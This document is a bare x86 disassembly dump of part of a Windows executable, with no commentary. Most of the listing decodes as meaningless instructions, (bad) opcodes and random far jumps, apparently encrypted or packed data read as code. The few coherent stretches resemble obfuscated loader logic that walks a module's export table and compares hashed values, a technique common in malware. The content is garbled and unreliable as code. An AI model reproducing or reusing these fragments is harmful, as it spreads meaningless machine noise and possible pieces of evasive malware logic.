  40c048:	outs   dx,DWORD PTR ds:[esi]
  40c049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c04a:	(bad)  
  40c04b:	mov    ebx,DWORD PTR [ecx]
  40c04d:	pop    ecx
  40c04e:	mov    edi,DWORD PTR [ecx+0x3c]
  40c051:	in     al,0x5c
  40c053:	ret    
  40c054:	push   esp
  40c055:	stc    
  40c056:	mov    BYTE PTR [ebp+0x4b],al
  40c059:	adc    cl,al
  40c05b:	xlat   BYTE PTR ds:[ebx]
  40c05c:	jp     0x40c030
  40c05e:	mov    ah,0xe5
  40c060:	mov    ?,esi
  40c062:	jno    0x40c0b9
  40c064:	fisub  DWORD PTR [esi-0x4a]
  40c067:	xor    ch,0xc6
  40c06a:	mov    bl,0x8b
  40c06c:	xchg   BYTE PTR [edi+0x44],bl
  40c06f:	out    dx,al
  40c070:	mov    ds,edi
  40c072:	pusha  
  40c073:	inc    esi
  40c074:	fsub   QWORD PTR [ebp*1+0x5225d076]
  40c07b:	js     0x40c056
  40c07d:	not    BYTE PTR [edi-0x1f]
  40c080:	je     0x40c084
  40c082:	sub    DWORD PTR [edi-0x5fa01708],ebp
  40c088:	shr    DWORD PTR [edi+0x25],1
  40c08b:	cmp    edx,ebp
  40c08d:	mov    dl,0x1
  40c08f:	enter  0x1311,0x8d
  40c093:	jns    0x40c07f
  40c095:	sbb    DWORD PTR ds:0xa1204803,eax
  40c09b:	inc    edx
  40c09c:	add    eax,0x50b0043
  40c0a1:	or     al,0xee
  40c0a3:	inc    edx
  40c0a4:	add    BYTE PTR [ebx+0x430542],ah
  40c0aa:	mov    DWORD PTR [ebp-0x28],ecx
  40c0ad:	mov    eax,DWORD PTR [ebp-0x14]
  40c0b0:	or     DWORD PTR ds:0x42ee1c,0x6327
  40c0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0bd:	add    ecx,DWORD PTR [eax+0x24]
  40c0c0:	mov    eax,ds:0x43049e
  40c0c5:	xor    eax,DWORD PTR ds:0x42e762
  40c0cb:	mov    ds:0x43049e,eax
  40c0d0:	mov    DWORD PTR [ebp-0x2c],ecx
  40c0d3:	and    DWORD PTR ds:0x4304a6,0x0
  40c0dd:	mov    eax,ds:0x4304a6
  40c0e2:	inc    eax
  40c0e3:	mov    ds:0x4304a6,eax
  40c0e8:	cmp    DWORD PTR ds:0x4304a6,0x1b
  40c0ef:	jne    0x40c11d
  40c0f5:	push   0x4304b2
  40c0fa:	push   0x1519
  40c0ff:	push   DWORD PTR [ebp-0x18]
  40c102:	push   0x42e776
  40c107:	push   DWORD PTR [ebp-0x24]
  40c10a:	push   0x42e8f3
  40c10f:	push   DWORD PTR [ebp-0x24]
  40c112:	push   0x667e
  40c117:	call   DWORD PTR ds:0x42eaf4
  40c11d:	cmp    DWORD PTR ds:0x4304a6,0x14
  40c124:	jb     0x40c0dd
  40c12a:	mov    eax,DWORD PTR [ebp-0x14]
  40c12d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c130:	add    ecx,DWORD PTR [eax+0x1c]
  40c133:	xor    esi,esi
  40c135:	jmp    0x40c293
  40c13a:	xchg   ebp,eax
  40c13b:	leave  
  40c13c:	popa   
  40c13d:	jge    0x40c1bc
  40c13f:	jge    0x40c0ee
  40c141:	fldenv [eax-0x2b]
  40c144:	test   al,0xed
  40c146:	lods   al,BYTE PTR ds:[esi]
  40c147:	gs cmp ebp,esp
  40c14a:	xor    bh,ch
  40c14c:	jle    0x40c1cc
  40c14e:	aas    
  40c14f:	jg     0x40c1cf
  40c151:	jle    0x40c1bf
  40c153:	jl     0x40c183
  40c155:	mov    ds:0xd5eca5c5,al
  40c15a:	push   cs
  40c15b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c15c:	rcr    DWORD PTR [eax+0x32ae0ec4],1
  40c162:	add    DWORD PTR [ecx],eax
  40c164:	adc    BYTE PTR [edi+0x71],al
  40c167:	inc    ecx
  40c168:	pop    ebp
  40c169:	push   ds
  40c16a:	hlt    
  40c16b:	(bad)  
  40c16c:	nop
  40c16d:	xor    BYTE PTR [eax-0x4260522a],cl
  40c173:	out    0x27,eax
  40c175:	ins    DWORD PTR es:[edi],dx
  40c176:	js     0x40c152
  40c178:	xchg   ecx,eax
  40c179:	xchg   edx,eax
  40c17a:	lds    esi,FWORD PTR [eax+0x77]
  40c17d:	mov    al,ds:0x11592668
  40c182:	inc    edi
  40c183:	mov    edi,eax
  40c185:	and    edx,DWORD PTR [eax+0x49]
  40c188:	out    0xeb,al
  40c18a:	pop    edi
  40c18b:	mov    cl,0x71
  40c18d:	sbb    edx,DWORD PTR [ebx+0x5f82fe30]
  40c193:	shr    BYTE PTR [ebx-0x26621847],1
  40c199:	call   0x9eab0cc0
  40c19e:	dec    esp
  40c19f:	xchg   esp,eax
  40c1a1:	cwde   
  40c1a2:	mov    ch,0xf7
  40c1a4:	xchg   edx,eax
  40c1a5:	mov    dl,0x12
  40c1a7:	push   ebp
  40c1a8:	push   0x62
  40c1aa:	pop    edx
  40c1ab:	call   0x82bf0ab7
  40c1b0:	ins    BYTE PTR es:[edi],dx
  40c1b1:	test   DWORD PTR [esi],edi
  40c1b3:	shl    DWORD PTR [edi+0x41],cl
  40c1b6:	sub    ebx,DWORD PTR [ebx]
  40c1b8:	mov    eax,ds:0x66bd4f92
  40c1bd:	loopne 0x40c18c
  40c1bf:	ror    DWORD PTR [esi],0x37
  40c1c2:	add    eax,ebp
  40c1c4:	imul   DWORD PTR [ecx-0x7c525726]
  40c1ca:	pushf  
  40c1cb:	push   ebp
  40c1cc:	lods   al,BYTE PTR ds:[esi]
  40c1cd:	test   BYTE PTR [esi],cl
  40c1cf:	stc    
  40c1d0:	(bad)  
  40c1d2:	jnp    0x40c172
  40c1d4:	fs adc al,0x3b
  40c1d7:	ins    BYTE PTR es:[edi],dx
  40c1d8:	adc    ebx,esp
  40c1da:	stc    
  40c1db:	call   0xae0c:0xe7378a18
  40c1e2:	iret   
  40c1e3:	sbb    BYTE PTR [eax],0x53
  40c1e6:	outs   dx,DWORD PTR ds:[esi]
  40c1e7:	fwait
  40c1e8:	(bad)  
  40c1e9:	enter  0x9ffd,0x3b
  40c1ed:	(bad)  
  40c1ee:	mov    al,ds:0x4e95651d
  40c1f3:	lahf   
  40c1f4:	xchg   ebx,eax
  40c1f5:	jmp    0xc28f:0xe80bfdb2
  40c1fc:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40c1fe:	add    ecx,DWORD PTR [edx]
  40c200:	lock push ss
  40c202:	pop    edx
  40c203:	push   edx
  40c204:	push   0x2b837f19
  40c209:	je     0x40c233
  40c20b:	retf   0x3817
  40c20e:	jb     0x40c286
  40c210:	xchg   ecx,eax
  40c211:	inc    ecx
  40c212:	jbe    0x40c201
  40c214:	sub    eax,0xc5e9f2a7
  40c219:	xlat   BYTE PTR ds:[ebx]
  40c21a:	outs   dx,DWORD PTR ds:[esi]
  40c21b:	adc    ebp,DWORD PTR [ecx+0x2f]
  40c21e:	add    al,0xb1
  40c220:	push   ebp
  40c221:	sub    eax,0xe135a2cc
  40c226:	cdq    
  40c227:	xor    dh,ch
  40c229:	sbb    eax,0x5b7614ae
  40c22e:	mov    al,ds:0xeaf05bd1
  40c233:	into   
  40c234:	sub    ebp,DWORD PTR [ecx]
  40c236:	(bad)  
  40c237:	call   0x8e5b:0x476a55f6
  40c23e:	fscale 
  40c240:	clc    
  40c241:	arpl   dx,cx
  40c243:	stc    
  40c244:	xor    ebx,ebx
  40c246:	inc    ebp
  40c248:	push   ebx
  40c249:	scas   al,BYTE PTR es:[edi]
  40c24a:	jb     0x40c28e
  40c24c:	pop    ss
  40c24d:	push   ds
  40c24e:	xchg   ecx,eax
  40c24f:	jae    0x40c224
  40c251:	add    al,0x84
  40c253:	repz dec esp
  40c255:	in     eax,0x0
  40c257:	adc    dh,bh
  40c259:	xchg   BYTE PTR [ecx+ebx*1-0x49],ah
  40c25d:	ins    DWORD PTR es:[edi],dx
  40c25e:	cli    
  40c25f:	sbb    eax,0x630cf1ea
  40c264:	xchg   DWORD PTR [ebp-0x1f],ecx
  40c267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c268:	ins    DWORD PTR es:[edi],dx
  40c269:	mov    dh,BYTE PTR [edi]
  40c26b:	loop   0x40c2d0
  40c26d:	add    al,0xb9
  40c26f:	test   esi,ecx
  40c271:	ds loope 0x40c2cf
  40c274:	ins    BYTE PTR es:[edi],dx
  40c275:	dec    eax
  40c276:	push   edx
  40c277:	push   es
  40c278:	addr16 ja 0x40c1ff
  40c27b:	in     eax,0x3e
  40c27d:	dec    edx
  40c27e:	jne    0x40c29f
  40c280:	xchg   ebp,eax
  40c281:	push   ss
  40c282:	ins    BYTE PTR es:[edi],dx
  40c283:	push   esp
  40c284:	aam    0x70
  40c286:	push   eax
  40c287:	or     DWORD PTR [ebp+0x4e],ebp
  40c28a:	inc    eax
  40c28b:	imul   eax,edx,0xaa92b2ff
  40c291:	pop    DWORD PTR [ebp-0x77]
  40c294:	dec    ebp
  40c295:	in     al,dx
  40c296:	mov    eax,DWORD PTR [ebp-0x28]
  40c299:	mov    ecx,DWORD PTR [ebp+0x8]
  40c29c:	add    ecx,DWORD PTR [eax+edi*4]
  40c29f:	jmp    0x40c3fd
  40c2a4:	lea    edx,[esi-0x1a42cd67]
  40c2aa:	pop    ebp
  40c2ab:	imul   edx,DWORD PTR ds:0xb7e92bcc,0xf3d1c438
  40c2b5:	(bad)  
  40c2b6:	jle    0x40c336
  40c2b8:	aas    
  40c2b9:	jg     0x40c339
  40c2bb:	jle    0x40c2b2
  40c2bd:	pop    ebp
  40c2be:	adc    DWORD PTR [edi-0x45],0x9dc5cff
  40c2c5:	mov    edx,0xc78de2f0
  40c2ca:	sbb    bh,BYTE PTR [ecx+0x41]
  40c2cd:	push   ebx
  40c2ce:	or     eax,DWORD PTR [ebp-0x65]
  40c2d1:	pop    esi
  40c2d2:	inc    ecx
  40c2d3:	and    eax,0x3a8ef5ae
  40c2d8:	or     al,0x80
  40c2da:	loop   0x40c2c9
  40c2dc:	push   edi
  40c2dd:	les    edi,FWORD PTR [ecx-0x2c13bd4a]
  40c2e3:	sbb    DWORD PTR [eax+eiz*8-0x38da659e],ecx
  40c2ea:	in     al,0xe6
  40c2ec:	push   ds
  40c2ed:	jb     0x40c326
  40c2ef:	dec    edi
  40c2f0:	repz mov ecx,0xc1cdd08
  40c2f6:	aad    0xa1
  40c2f8:	das    
  40c2f9:	lock repnz adc eax,0x209f94ba
  40c300:	push   es
  40c301:	call   0xca5accc
  40c306:	cli    
  40c307:	scas   eax,DWORD PTR es:[edi]
  40c308:	outs   dx,DWORD PTR ds:[esi]
  40c309:	ficom  DWORD PTR [eax+0x65357bff]
  40c30f:	cs jp  0x40c352
  40c312:	push   ds
  40c313:	sbb    esp,esi
  40c315:	mov    ch,ch
  40c317:	or     DWORD PTR [ebx+0x20],ebp
  40c31a:	mov    esp,eax
  40c31c:	pop    ds
  40c31d:	jo     0x40c38f
  40c31f:	push   0x851c8d98
  40c324:	push   edx
  40c325:	mov    al,ds:0xc3a336f4
  40c32a:	mov    al,ds:0x5c4ba219
  40c32f:	xor    ah,BYTE PTR [ecx-0xf5589c4]
  40c335:	cmp    al,bl
  40c337:	out    0x99,al
  40c339:	std    
  40c33a:	cmp    ch,BYTE PTR [ecx+0x6afb83de]
  40c340:	cmp    al,BYTE PTR [edx+0x76]
  40c343:	into   
  40c344:	arpl   WORD PTR [ebx],bp
  40c346:	mov    ch,0xa7
  40c348:	jo     0x40c30e
  40c34a:	imul   edi,DWORD PTR [edi-0x14],0xf3d82397
  40c351:	push   0xfffffff9
  40c353:	arpl   WORD PTR [edx],cx
  40c355:	xchg   DWORD PTR [esp+ebx*2+0x7d4038c1],edi
  40c35c:	lgs    edx,FWORD PTR [ecx]
  40c35f:	ins    WORD PTR es:[edi],dx
  40c361:	gs mov esi,0xdef7fb45
  40c367:	xchg   ecx,eax
  40c368:	pop    ss
  40c369:	ds test al,0xd5
  40c36c:	xchg   edi,eax
  40c36d:	add    ebx,DWORD PTR [edi]
  40c36f:	adc    al,0x25
  40c371:	pop    es
  40c372:	test   BYTE PTR [ecx],al
  40c374:	cwde   
  40c375:	jl     0x40c3de
  40c377:	je     0x40c34a
  40c379:	mov    eax,ds:0xe69bee60
  40c37e:	jmp    0x40c335
  40c380:	cmc    
  40c381:	aad    0x3e
  40c383:	lds    ebx,FWORD PTR [eax*1-0x13c937ec]
  40c38a:	lods   eax,DWORD PTR ds:[esi]
  40c38b:	mov    ebx,ecx
  40c38d:	dec    ebx
  40c38e:	xor    al,0x85
  40c390:	mov    bl,0xf5
  40c392:	mov    dl,0x20
  40c394:	(bad)  
  40c395:	repnz test eax,0x418cd340
  40c39b:	xchg   ebp,eax
  40c39c:	lock xchg DWORD PTR [edi+0x75],esi
  40c3a0:	cmc    
  40c3a1:	jg     0x40c3d1
  40c3a3:	cmp    eax,0xcab68c6c
  40c3a8:	out    0x57,eax
  40c3aa:	dec    edi
  40c3ab:	enter  0xae07,0x68
  40c3af:	lods   al,BYTE PTR ds:[esi]
  40c3b0:	(bad)  
  40c3b1:	jmp    0x97d1:0x4b4838e9
  40c3b8:	pop    esi
  40c3b9:	sub    dh,al
  40c3bb:	xor    eax,DWORD PTR [ebp-0x666f656b]
  40c3c1:	mov    edi,0x2eeb9e29
  40c3c6:	xor    eax,0xfe1562af
  40c3cb:	in     al,dx
  40c3cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3cd:	rcr    BYTE PTR [edi-0x77323d2e],cl
  40c3d3:	xchg   ebx,eax
  40c3d4:	mov    ebp,0xc56a3eaf
  40c3d9:	xor    BYTE PTR [ebp+0xe],0x7
  40c3dd:	jmp    0x85b:0xe04020d3
  40c3e4:	loope  0x40c381
  40c3e6:	div    BYTE PTR [ebx-0x9]
  40c3e9:	jecxz  0x40c451
  40c3eb:	ret    
  40c3ec:	and    ch,ch
  40c3ee:	repnz xchg ebp,eax
  40c3f0:	jo     0x40c43d
  40c3f2:	ins    DWORD PTR es:[edi],dx
  40c3f3:	jbe    0x40c413
  40c3f5:	sar    BYTE PTR [edi-0x1f2de9cc],1
  40c3fb:	lahf   
  40c3fc:	mov    ebx,0xe9f8458d
  40c401:	pop    ecx
  40c402:	add    DWORD PTR [eax],eax
  40c404:	add    BYTE PTR [ecx],ah
  40c406:	stos   BYTE PTR es:[edi],al
  40c407:	ja     0x40c433
  40c409:	popf   
  40c40a:	stos   DWORD PTR es:[edi],eax
  40c40b:	and    eax,0xb3c66ebd
  40c410:	sti    
  40c411:	push   ss
  40c412:	rcl    BYTE PTR [esi],1
  40c414:	shl    BYTE PTR [edi+edi*8+0x7f3f7e7e],cl
  40c41b:	jle    0x40c49b
  40c41d:	pop    esp
  40c41e:	jecxz  0x40c467
  40c420:	out    dx,eax
  40c421:	inc    ebp
  40c422:	push   ebx
  40c423:	inc    edx
  40c424:	adc    ecx,DWORD PTR [ebp+0xc]
  40c427:	arpl   WORD PTR [ecx-0x72e9dbc5],sp
  40c42d:	dec    ebx
  40c42e:	mov    bh,0x33
  40c430:	test   al,0x87
  40c432:	adc    al,0x56
  40c434:	sti    
  40c435:	cmp    al,0x8b
  40c437:	xchg   edx,eax
  40c438:	sub    DWORD PTR [ecx],eax
  40c43a:	jle    0x40c430
  40c43c:	mov    ah,0xe7
  40c43e:	cmp    dl,al
  40c440:	ins    BYTE PTR es:[edi],dx
  40c441:	repnz push eax
  40c443:	pop    ecx
  40c444:	push   es
  40c445:	and    DWORD PTR [eax-0x2f03901a],esi
  40c44b:	ss jecxz 0x40c41f
  40c44e:	and    al,0x29
  40c450:	push   ss
  40c451:	ret    0xe262
  40c454:	out    0x5,eax
  40c456:	stos   BYTE PTR es:[edi],al
  40c457:	jo     0x40c434
  40c459:	jmp    0xc17f0f1a
  40c45e:	mov    ch,0x4c
  40c460:	pop    eax
  40c461:	adc    edi,DWORD PTR [edi+eax*4]
  40c464:	test   eax,0x56c62566
  40c469:	ss mov dl,0x5a
  40c46c:	mov    al,0xe8
  40c46e:	shl    ebp,1
  40c470:	mov    esp,0x426fd08b
  40c475:	jo     0x40c454
  40c477:	arpl   WORD PTR [eax],si
  40c479:	jbe    0x40c484
  40c47b:	stos   BYTE PTR es:[edi],al
  40c47c:	(bad)  
  40c47d:	mov    al,ds:0x779f661
  40c482:	fist   DWORD PTR [ebx+edi*1+0x11d48d2c]
  40c489:	mov    eax,ss
  40c48b:	xchg   esp,eax
  40c48c:	and    al,dh
  40c48e:	scas   eax,DWORD PTR es:[edi]
  40c48f:	ss pop edi
  40c491:	adc    cl,BYTE PTR ds:0xbef2ea6d
  40c497:	mov    ecx,0x96defff5
  40c49c:	les    esp,FWORD PTR [edi-0x45d76af7]
  40c4a2:	or     BYTE PTR [ebx],al
  40c4a4:	sbb    eax,0x6f359a8e
  40c4a9:	stc    
  40c4aa:	push   ss
  40c4ab:	shl    BYTE PTR [edx-0x27],1
  40c4ae:	repnz sar DWORD PTR [esi],0xe0
  40c4b2:	in     al,dx
  40c4b3:	mov    dh,BYTE PTR [esi]
  40c4b5:	jno    0x40c4ad
  40c4b7:	fstp   st(2)
  40c4b9:	jmp    0xb93ce20b
  40c4be:	sbb    DWORD PTR [esi-0x24],esp
  40c4c1:	test   dh,0xb5
  40c4c4:	(bad)  
  40c4c5:	mov    edi,0x609a51a6
  40c4ca:	or     ecx,DWORD PTR [ecx+0x13]
  40c4cd:	inc    ecx
  40c4ce:	xchg   edx,eax
  40c4cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4d0:	adc    al,BYTE PTR ds:[ebx]
  40c4d3:	in     eax,0xc6
  40c4d5:	sti    
  40c4d6:	std    
  40c4d7:	and    DWORD PTR [edi],esp
  40c4d9:	mov    ebx,0xe5b36886
  40c4de:	jb     0x40c55f
  40c4e0:	jecxz  0x40c47a
  40c4e2:	mov    DWORD PTR [ebx],edi
  40c4e4:	(bad)  
  40c4e5:	push   esp
  40c4e6:	push   ss
  40c4e7:	push   0x232ca718
  40c4ec:	fst    DWORD PTR [esi+0x46]
  40c4ef:	cmp    eax,0x98400b2d
  40c4f4:	shr    cl,cl
  40c4f6:	cld    
  40c4f7:	or     al,0x3c
  40c4f9:	scas   eax,DWORD PTR es:[edi]
  40c4fa:	dec    ecx
  40c4fb:	or     BYTE PTR [edx+0xb],dl
  40c4fe:	mov    eax,0x45104a99
  40c503:	mov    cl,0xaa
  40c505:	jns    0x40c505
  40c507:	add    eax,0x3ae470e0
  40c50c:	(bad)  
  40c50d:	(bad)  
  40c50e:	(bad)  [edi]
  40c510:	mov    ebx,DWORD PTR [edi]
  40c512:	mov    ds:0x54f1e6f9,al
  40c517:	sbb    BYTE PTR [esi],0x8a
  40c51a:	out    dx,eax
  40c51b:	inc    edx
  40c51c:	jne    0x40c54f
  40c51e:	mov    dh,ah
  40c520:	out    0x64,al
  40c522:	int    0x18
  40c524:	fs add al,0x27
  40c527:	xor    dl,BYTE PTR [edi+eiz*1]
  40c52a:	cwde   
  40c52b:	xor    eax,0xc2e11466
  40c530:	jl     0x40c4e5
  40c532:	inc    esi
  40c533:	int3   
  40c534:	shl    eax,0x1f
  40c537:	dec    ecx
  40c538:	push   cs
  40c539:	cs ja  0x40c54a
  40c53c:	mov    dh,0x53
  40c53e:	xor    DWORD PTR [ebp+0x4b126728],ebp
  40c544:	outs   dx,DWORD PTR ds:[esi]
  40c545:	retf   0x25cf
  40c548:	mov    ds:0x2228f628,eax
  40c54d:	push   cs
  40c54e:	cmp    edx,edi
  40c550:	jge    0x40c4fe
  40c552:	aad    0x8b
  40c554:	ss cwde 
  40c556:	inc    esp
  40c557:	sub    DWORD PTR [ebx],0xb105752
  40c55d:	leave  
  40c55e:	mov    DWORD PTR [ebp-0x30],ecx
  40c561:	push   eax
  40c562:	push   DWORD PTR [ebp-0x30]
  40c565:	push   DWORD PTR [ebp+0xc]
  40c568:	call   0x406fc8
  40c56d:	mov    eax,DWORD PTR [ebp-0x4]
  40c570:	jmp    0x40c6ce
  40c575:	push   esi
  40c576:	sahf   
  40c577:	sbb    al,0x64
  40c579:	fdivr  QWORD PTR [esi+edx*2-0x44]
  40c57d:	or     esi,DWORD PTR [esi-0x27]
  40c580:	cmp    eax,0xb6eb3d53
  40c585:	jne    0x40c578
  40c587:	jle    0x40c607
  40c589:	aas    
  40c58a:	jg     0x40c60a
  40c58c:	jle    0x40c5df
  40c58e:	mov    fs,WORD PTR [ecx+ebp*2]
  40c591:	xchg   esp,eax
  40c592:	in     eax,0x1d
  40c594:	or     BYTE PTR [eax+0x72471d5e],ah
  40c59a:	ret    0xd2c4
  40c59d:	inc    edx
  40c59e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c59f:	add    BYTE PTR ds:0x113bbaa2,ch
  40c5a5:	stos   DWORD PTR es:[edi],eax
  40c5a6:	inc    ebp
  40c5a7:	jns    0x40c56c
  40c5a9:	jb     0x40c5ee
  40c5ab:	push   cs
  40c5ac:	fcom   DWORD PTR [esi+0x3d452515]
  40c5b2:	mov    DWORD PTR [ebp+0x64],esp
  40c5b5:	add    ch,ch
  40c5b7:	out    dx,eax
  40c5b8:	popf   
  40c5b9:	mov    al,0x1e
  40c5bb:	and    eax,0xc519d0b2
  40c5c0:	es mov ebp,0xda632e6f
  40c5c6:	lea    ebx,ds:0x24d5ed9b
  40c5cc:	mov    esi,0xa70395da
  40c5d1:	mov    edx,0xa1463b3
  40c5d6:	xor    DWORD PTR [ecx+0x1f],ecx
  40c5d9:	add    DWORD PTR [ecx-0x29],esp
  40c5dc:	cmp    cl,BYTE PTR [edx+0x7e]
  40c5df:	sbb    BYTE PTR ss:[edx+0x6e269fc],bl
  40c5e6:	sar    DWORD PTR [ebx-0x22],1
  40c5e9:	das    
  40c5ea:	sub    al,0x8d
  40c5ec:	loope  0x40c664
  40c5ee:	test   al,0x76
  40c5f0:	fld    TBYTE PTR [ebp+0x58c1051b]
  40c5f6:	dec    ebp
  40c5f7:	cmp    ch,dh
  40c5f9:	xchg   edi,eax
  40c5fa:	scas   al,BYTE PTR es:[edi]
  40c5fb:	gs cs cmc 
  40c5fe:	icebp  
  40c5ff:	mov    al,0xf8
  40c601:	fisubr WORD PTR [eax+0x3e69bac1]
  40c607:	mov    dh,0x3
  40c609:	and    eax,0x39806cec
  40c60e:	jmp    0x30a0:0xa519c27
  40c615:	add    al,0x18
  40c617:	call   0xece404f1
  40c61c:	jb     0x40c64d
  40c61e:	pushf  
  40c61f:	je     0x40c61d
  40c621:	stos   DWORD PTR es:[edi],eax
  40c622:	outs   dx,BYTE PTR ds:[esi]
  40c623:	sbb    BYTE PTR [esi+edi*1-0x74ddc071],cl
  40c62a:	xlat   BYTE PTR ds:[ebx]
  40c62b:	jb     0x40c619
  40c62d:	hlt    
  40c62e:	pop    ds
  40c62f:	push   ss
  40c630:	mov    esi,0xbf963cc7
  40c635:	sahf   
  40c636:	and    DWORD PTR [edi+0x4a500408],esp
  40c63c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c63d:	ins    BYTE PTR es:[edi],dx
  40c63e:	leave  
  40c63f:	add    edi,DWORD PTR [ebp-0x6779c025]
  40c645:	aam    0x18
  40c647:	mov    al,0xdf
  40c649:	outs   dx,DWORD PTR ds:[esi]
  40c64a:	dec    eax
  40c64b:	lds    eax,FWORD PTR [edi+0x59]
  40c64e:	sub    cl,bl
  40c650:	into   
  40c651:	xor    DWORD PTR [edi-0x724dbe18],edx
  40c657:	je     0x40c6bf
  40c659:	pusha  
  40c65a:	mov    eax,0x4519ed5
  40c65f:	fistp  WORD PTR ds:0x859c60b5
  40c665:	test   esp,ecx
  40c667:	cmp    edx,DWORD PTR [edx]
  40c669:	fldenv [ecx]
  40c66b:	mov    al,ds:0xc9deec83
  40c670:	or     esi,esp
  40c672:	dec    eax
  40c673:	ret    
  40c674:	jle    0x40c678
  40c676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c677:	test   al,0x41
  40c679:	pop    ss
  40c67a:	adc    eax,0x9a7d06b3
  40c67f:	or     BYTE PTR [ebp+0x67],cl
  40c682:	cwde   
  40c683:	shl    DWORD PTR [edx-0x76],1
  40c686:	fs into 
  40c688:	inc    ecx
  40c689:	fs js  0x40c6b6
  40c68c:	aas    
  40c68d:	into   
  40c68e:	sbb    al,BYTE PTR [ebp+0x1d2b7967]
  40c694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c695:	enter  0x42ab,0x88
  40c699:	lods   al,BYTE PTR ds:[esi]
  40c69a:	lea    esi,[ecx+0x4d]
  40c69d:	mov    ah,0x7e
  40c69f:	mov    WORD PTR [ebx-0x52a92869],?
  40c6a5:	and    edx,DWORD PTR [ebx+0x439992cd]
  40c6ab:	and    BYTE PTR ss:[esi],ah
  40c6ae:	mov    dh,0xf1
  40c6b0:	pop    es
  40c6b1:	pop    ebx
  40c6b2:	sub    dh,BYTE PTR [edi-0x19b83a0f]
  40c6b8:	leave  
  40c6b9:	dec    esp
  40c6ba:	dec    edi
  40c6bb:	test   al,0x6c
  40c6bd:	hlt    
  40c6be:	shl    BYTE PTR [esi-0x58],cl
  40c6c1:	mov    es,edi
  40c6c3:	or     BYTE PTR [ebx+0x75],0xb6
  40c6c7:	sbb    ecx,ecx
  40c6c9:	push   cx
  40c6cb:	in     al,0xfc
  40c6cd:	fimul  DWORD PTR [ebx+0x5635f84d]
  40c6d3:	or     BYTE PTR [ecx+0x7],dl
  40c6d6:	add    eax,ebx
  40c6d8:	cmp    ecx,eax
  40c6da:	jne    0x40c6fd
  40c6e0:	mov    eax,DWORD PTR [ebp-0x20]
  40c6e3:	inc    edi
  40c6e4:	cmp    edi,eax
  40c6e6:	jb     0x40b937
  40c6ec:	jmp    0x40c70d
  40c6f1:	mov    eax,DWORD PTR [ebp-0x4]
  40c6f4:	xor    eax,esi
  40c6f6:	add    eax,ebx
  40c6f8:	jmp    0x40e0f7
  40c6fd:	mov    eax,DWORD PTR [ebp-0x2c]
  40c700:	movzx  eax,WORD PTR [eax+edi*2]
  40c704:	mov    ecx,DWORD PTR [ebp-0x14]
  40c707:	mov    eax,DWORD PTR [ecx+eax*4]
  40c70a:	mov    DWORD PTR [ebp+0xc],eax
  40c70d:	mov    eax,DWORD PTR [ebp-0x4]
  40c710:	mov    ecx,DWORD PTR [ebp-0x8]
  40c713:	xor    eax,0x7510856
  40c718:	add    eax,ebx
  40c71a:	cmp    ecx,eax
  40c71c:	jne    0x40c88d
  40c722:	mov    eax,DWORD PTR [ebp-0x4]
  40c725:	xor    eax,0x7510856
  40c72a:	jmp    0x40c6f6
  40c72f:	jmp    0x40c88d
  40c734:	pop    eax
  40c735:	mov    WORD PTR ds:0x5da1fd90,?
  40c73b:	jl     0x40c715
  40c73d:	xchg   ecx,eax
  40c73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c740:	jbe    0x40c6cb
  40c742:	push   edi
  40c743:	pop    esi
  40c744:	ss bnd jle 0x40c7c6
  40c748:	aas    
  40c749:	jg     0x40c7c9
  40c74b:	jle    0x40c77f
  40c74d:	push   0xe8e69ebb
  40c752:	dec    eax
  40c753:	inc    ecx
  40c754:	add    esi,ebp
  40c756:	dec    edi
  40c757:	repz cs or eax,0xe31fdc93
  40c75e:	pop    es
  40c75f:	mov    esi,0x705f0b12
  40c764:	aam    0xf0
  40c766:	jg     0x40c7e5
  40c768:	mov    cl,0x8f
  40c76a:	jmp    0x600c:0x56976d20
  40c771:	ss sti 
  40c773:	addr16 cmc 
  40c775:	sbb    DWORD PTR [edx+0x37],eax
  40c778:	cli    
  40c779:	leave  
  40c77a:	lods   eax,DWORD PTR ds:[esi]
  40c77b:	and    al,0x7f
  40c77d:	adc    BYTE PTR fs:[ebx+edi*1+0x1b],al
  40c782:	ins    BYTE PTR es:[edi],dx
  40c783:	mov    ds:0x81a3efa3,eax
  40c788:	cmovle esp,DWORD PTR ds:0x6e539233
  40c78f:	inc    ebx
  40c790:	ret    
  40c791:	scas   eax,DWORD PTR es:[edi]
  40c792:	ins    BYTE PTR es:[edi],dx
  40c793:	hlt    
  40c794:	retf   0xeb97
  40c797:	xchg   edx,eax
  40c798:	(bad)  [esi-0x4f448784]
  40c79e:	into   
  40c79f:	or     ah,BYTE PTR [edi-0x45]
  40c7a2:	idiv   DWORD PTR [esi+eax*2]
  40c7a5:	or     al,0x35
  40c7a7:	(bad)  
  40c7a8:	shl    DWORD PTR [edx+0x10],1
  40c7ab:	fcomip st,st(4)
  40c7ad:	jae    0x40c788
  40c7af:	mul    al
  40c7b1:	ret    0x71a0
  40c7b4:	or     eax,0x8e1fd0fa
  40c7b9:	jg     0x40c7f5
  40c7bb:	lods   al,BYTE PTR ds:[esi]
  40c7bc:	cmc    
  40c7bd:	inc    esi
  40c7be:	xor    bl,BYTE PTR [ebx]
  40c7c0:	sbb    eax,0x8ff2d694
  40c7c5:	cld    
  40c7c6:	addr16 cwde 
  40c7c8:	shl    DWORD PTR [ebx],cl
  40c7ca:	loop   0x40c80a
  40c7cc:	aaa    
  40c7cd:	sub    ecx,edi
  40c7cf:	iret   
  40c7d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7d1:	push   ds
  40c7d2:	xchg   esi,eax
  40c7d3:	ins    DWORD PTR es:[edi],dx
  40c7d4:	fldcw  WORD PTR [eax-0x64]
  40c7d7:	push   cs
  40c7d8:	inc    eax
  40c7d9:	jno    0x40c7b2
  40c7db:	xor    eax,0x137ed70e
  40c7e0:	out    0xa5,eax
